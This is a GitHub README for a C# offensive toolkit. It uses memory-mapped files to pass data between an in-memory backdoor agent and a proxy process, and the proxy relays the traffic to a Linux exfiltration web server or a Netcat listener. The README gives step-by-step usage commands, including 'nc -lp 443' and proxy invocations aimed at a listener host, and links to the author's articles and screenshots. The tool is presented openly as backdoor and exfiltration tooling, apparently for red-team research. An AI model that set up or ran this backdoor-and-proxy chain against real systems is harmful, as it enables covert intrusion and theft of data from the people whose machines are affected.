# NativePayload_MP
C# Memory Mapped File & Connection in-memory between Backdoor & Proxy Process
-------------------------


 NativePayload_MP.cs (old version, this code was as Mapper for working with NativePayload_MPAgent as backdoor in Memory only)
 
 usage: 
    
    step1: NativePayload_MPAgent.exe
    step2: NativePayload_MP.exe
    
--------------------------------------------    


 NativePayload_MP1.cs (this code is Mapper/Proxy tool for working with NativePayload_HTTP.sh as web Exfil-server tool) 
 
 usage: 
    
    step1: [win]                NativePayload_MPAgent.exe
    step2: [linux:192.168.56.1] NativePayload_HTTP.sh -exfilwebserver 80
    step3: [win]                NativePayload_MP1.exe 192.168.56.1 
    
 --------------------------------------------    
   

NativePayload_MP2.cs (this code is Mapper/Proxy tool for working with nc [Netcat]) 
 
 usage: 
    
    step1: [win]                NativePayload_MPAgent.exe
    step2: [linux:192.168.56.1] nc -lp 443
    step3: [win]                NativePayload_MP2.exe 192.168.56.1 443
--------------------------------------------    
    
NativePayload_MPAgent.cs (this code is our backdoor tool, working in memory only, without network connection) 
 
 usage: 
    
    step1: NativePayload_MPAgent.exe
   
---------------------------------------------    
    
Article [1]: https://www.linkedin.com/pulse/memory-mapping-file-connection-in-memory-between-damon-mohammadbagher/

Article [2]: https://damonmohammadbagher.github.io/Posts/10mar2021x.html

Video:

------------------------------------------------
NativePayload_MP1.cs (this code is Mapper/Proxy tool for working with NativePayload_HTTP.sh as web Exfil-server tool) 
 
![](https://github.com/DamonMohammadbagher/NativePayload_MP/blob/main/Pics/1.png)

------------------------------------------------
NativePayload_MP.cs (old version, this code was as Mapper for working with NativePayload_MPAgent as backdoor in Memory only)

![](https://github.com/DamonMohammadbagher/NativePayload_MP/blob/main/Pics/2-W10.png)

------------------------------------------------
NativePayload_MP2.cs (this code is Mapper/Proxy tool for working with nc [Netcat]) 

![](https://github.com/DamonMohammadbagher/NativePayload_MP/blob/main/Pics/mp2-01.png)


<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_MP"/></a></p>
